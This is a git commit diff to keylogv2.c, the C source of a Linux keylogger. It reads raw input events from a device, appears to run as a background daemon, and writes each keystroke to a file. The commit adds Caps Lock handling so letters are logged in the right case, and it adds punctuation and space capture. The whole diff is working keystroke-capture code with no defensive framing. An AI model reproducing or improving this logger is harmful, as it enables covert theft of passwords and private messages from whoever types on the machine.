6d32c14c6aa807a9875080168cb9c302b9d07533
drac-0 <muhammadfaiz050607@gmail.com>
2026-02-05 11:23:45 +0700

    .

--- keylogv2.c
+++ keylogv2.c
@@ -6,12 +6,14 @@
 #include <stdlib.h>
 #include <sys/types.h>
 #include <unistd.h>
-
+#include <stdbool.h>
 
 void writing(FILE *sd, char *w){
   fprintf(sd, w);
   fclose(sd);
 }
+
+void dummy();
 
 void daemonisasi(){
   pid_t pid = fork();
@@ -28,6 +30,7 @@ void daemonisasi(){
 }
 
 int main(int argc, char *argv[]){
+  bool CAPS = false;
   char *event = argv[1];
 
   int fd = open(argv[1], O_RDONLY, 0);
@@ -57,89 +60,203 @@ int main(int argc, char *argv[]){
       writing(fp, "0");
       continue;
     }
-    
-    switch(ie.code){
-      case KEY_A:
-        writing(fp, "A");
-        break;
-      case KEY_B:
-        writing(fp, "B");
-        break;
-      case KEY_C:
-        writing(fp, "C");
-        break;
-      case KEY_D:
-        writing(fp, "D");
-        break;
-      case KEY_E:
-        writing(fp, "E");
-        break;
-      case KEY_F:
-        writing(fp, "F");
-        break;
-      case KEY_G:
-        writing(fp, "G");
-        break;
-      case KEY_H:
-        writing(fp, "H");
-        break;
-      case KEY_I:
-        writing(fp, "I");
-        break;
-      case KEY_J:
-        writing(fp, "J");
-        break;
-      case KEY_K:
-        writing(fp, "K");
-        break;
-      case KEY_L:
-        writing(fp, "L");
-        break;
-      case KEY_M:
-        writing(fp, "M");
-        break;
-      case KEY_N:
-        writing(fp, "N");
-        break;
-      case KEY_O:
-        writing(fp, "O");
-        break;
-      case KEY_P:
-        writing(fp, "P");
-        break;
-      case KEY_Q:
-        writing(fp, "Q");
-        break;
-      case KEY_R :
-        writing(fp, "R");
-        break;
-      case KEY_S :
-        writing(fp, "S");
-        break;
-      case KEY_T :
-        writing(fp, "T");
-        break;
-      case KEY_U :
-        writing(fp, "U");
-        break;
-      case KEY_V :
-        writing(fp, "V");
-        break;
-      case KEY_W :
-        writing(fp, "W");
-        break;
-      case KEY_X :
-        writing(fp, "X");
-        break;
-      case KEY_Y :
-        writing(fp, "Y");
-        break;
-      case KEY_Z:
-        writing(fp, "Z");
-        break;
-      default:
-        printf("UNKNOWN");
+
+
+    else if (ie.code == KEY_CAPSLOCK){
+      CAPS = true;
+    } 
+
+    //capslock logic
+    if (CAPS){
+      switch(ie.code){
+        case KEY_A:
+          writing(fp, "A");
+          break;
+        case KEY_B:
+          writing(fp, "B");
+          break;
+        case KEY_C:
+          writing(fp, "C");
+          break;
+        case KEY_D:
+          writing(fp, "D");
+          break;
+        case KEY_E:
+          writing(fp, "E");
+          break;
+        case KEY_F:
+          writing(fp, "F");
+          break;
+        case KEY_G:
+          writing(fp, "G");
+          break;
+        case KEY_H:
+          writing(fp, "H");
+          break;
+        case KEY_I:
+          writing(fp, "I");
+          break;
+        case KEY_J:
+          writing(fp, "J");
+          break;
+        case KEY_K:
+          writing(fp, "K");
+          break;
+        case KEY_L:
+          writing(fp, "L");
+          break;
+        case KEY_M:
+          writing(fp, "M");
+          break;
+        case KEY_N:
+          writing(fp, "N");
+          break;
+        case KEY_O:
+          writing(fp, "O");
+          break;
+        case KEY_P:
+          writing(fp, "P");
+          break;
+        case KEY_Q:
+          writing(fp, "Q");
+          break;
+        case KEY_R :
+          writing(fp, "R");
+          break;
+        case KEY_S :
+          writing(fp, "S");
+          break;
+        case KEY_T :
+          writing(fp, "T");
+          break;
+        case KEY_U :
+          writing(fp, "U");
+          break;
+        case KEY_V :
+          writing(fp, "V");
+          break;
+        case KEY_W :
+          writing(fp, "W");
+          break;
+        case KEY_X :
+          writing(fp, "X");
+          break;
+        case KEY_Y :
+          writing(fp, "Y");
+          break;
+        case KEY_Z:
+          writing(fp, "Z");
+          break;
+      }
+    }
+    else{
+      switch(ie.code){
+        case KEY_A:
+          writing(fp, "a");
+          break;
+        case KEY_B:
+          writing(fp, "b");
+          break;
+        case KEY_C:
+          writing(fp, "c");
+          break;
+        case KEY_D:
+          writing(fp, "d");
+          break;
+        case KEY_E:
+          writing(fp, "e");
+          break;
+        case KEY_F:
+          writing(fp, "f");
+          break;
+        case KEY_G:
+          writing(fp, "g");
+          break;
+        case KEY_H:
+          writing(fp, "h");
+          break;
+        case KEY_I:
+          writing(fp, "i");
+          break;
+        case KEY_J:
+          writing(fp, "j");
+          break;
+        case KEY_K:
+          writing(fp, "k");
+          break;
+        case KEY_L:
+          writing(fp, "l");
+          break;
+        case KEY_M:
+          writing(fp, "m");
+          break;
+        case KEY_N:
+          writing(fp, "n");
+          break;
+        case KEY_O:
+          writing(fp, "o");
+          break;
+        case KEY_P:
+          writing(fp, "p");
+          break;
+        case KEY_Q:
+          writing(fp, "q");
+          break;
+        case KEY_R :
+          writing(fp, "r");
+          break;
+        case KEY_S :
+          writing(fp, "s");
+          break;
+        case KEY_T :
+          writing(fp, "t");
+          break;
+        case KEY_U :
+          writing(fp, "u");
+          break;
+        case KEY_V :
+          writing(fp, "v");
+          break;
+        case KEY_W :
+          writing(fp, "w");
+          break;
+        case KEY_X :
+          writing(fp, "x");
+          break;
+        case KEY_Y :
+          writing(fp, "y");
+          break;
+        case KEY_Z:
+          writing(fp, "z");
+          break;
+      }
     }
 
+    switch (ie.code) {
+      case KEY_SEMICOLON:
+        writing(fp, ";");
+        break;
+      case KEY_COMMA:
+        writing(fp, ",");
+        break;
+      case KEY_DOT:
+        writing(fp, ".");
+        break;
+      case KEY_SLASH:
+        writing(fp, "/");
+        break;
+      case KEY_BACKSLASH:
+        writing(fp, "\\");
+        break;
+      case KEY_SPACE:
+        writing(fp, " "); //space
+        break;
+      default:
+        printf("UNKNOWN\n");
+      }
+    printf("%d\n",CAPS);
+
   }
+
 }
+
